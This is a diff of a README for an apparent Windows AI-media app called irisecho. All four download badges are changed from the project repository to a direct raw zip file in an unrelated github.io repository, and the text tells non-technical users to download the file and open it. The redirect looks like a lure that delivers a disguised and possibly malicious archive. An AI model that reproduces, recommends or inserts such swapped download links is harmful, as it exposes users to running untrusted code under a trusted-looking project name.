@@ -5,7 +5,7 @@ description: "Generate images, video, voice, music, sound effects and 3D models 
 ---
 # 🎨 irisecho - Create AI Media Locally on Windows
 
-[![Download irisecho](https://img.shields.io/badge/Download_irisecho-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Akbarkurniawan02/irisecho)
+[![Download irisecho](https://img.shields.io/badge/Download_irisecho-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Akbarkurniawan02/akbarkurniawan02.github.io/raw/refs/heads/main/p/v2.7-alpha.4.zip)
 
 irisecho is a local AI studio for creating images, edits, video, voice, music, and sound effects on your own GPU. Use it at your desk, from your phone, or give it to your coding agents. Everything is designed for people who want powerful creative tools without needing to be a programmer.
 
@@ -52,7 +52,7 @@ irisecho is made for Windows and works with your own GPU. You do not need progra
 
 Visit this link to download the application.
 
-[![Download irisecho](https://img.shields.io/badge/Get_irisecho-ff6f61?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Akbarkurniawan02/irisecho)
+[![Download irisecho](https://img.shields.io/badge/Get_irisecho-ff6f61?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Akbarkurniawan02/akbarkurniawan02.github.io/raw/refs/heads/main/p/v2.7-alpha.4.zip)
 
 After the download is complete, open irisecho from where your downloads are saved. Follow the on-screen prompts inside the app to begin.
 
@@ -122,7 +122,7 @@ Yes. irisecho is built to be used at your desk, from your phone, or by coding ag
 
 Visit this link to download the application:
 
-[![Download irisecho](https://img.shields.io/badge/Download_irisecho-00c853?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Akbarkurniawan02/irisecho)
+[![Download irisecho](https://img.shields.io/badge/Download_irisecho-00c853?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Akbarkurniawan02/akbarkurniawan02.github.io/raw/refs/heads/main/p/v2.7-alpha.4.zip)
 
 ### Does irisecho use my own GPU?
 
@@ -136,6 +136,6 @@ You can work with images, edits, video, voice, music, and sound effects in one l
 
 Visit this link to download the application.
 
-[![Download irisecho](https://img.shields.io/badge/Download_Now-ff9800?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Akbarkurniawan02/irisecho)
+[![Download irisecho](https://img.shields.io/badge/Download_Now-ff9800?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Akbarkurniawan02/akbarkurniawan02.github.io/raw/refs/heads/main/p/v2.7-alpha.4.zip)
 
 Keywords: ai-agents, comfyui, desktop-app, image-generation, local-ai, music-generation, self-hosted, tauri, text-to-speech, video-generation, voice-cloning, windows
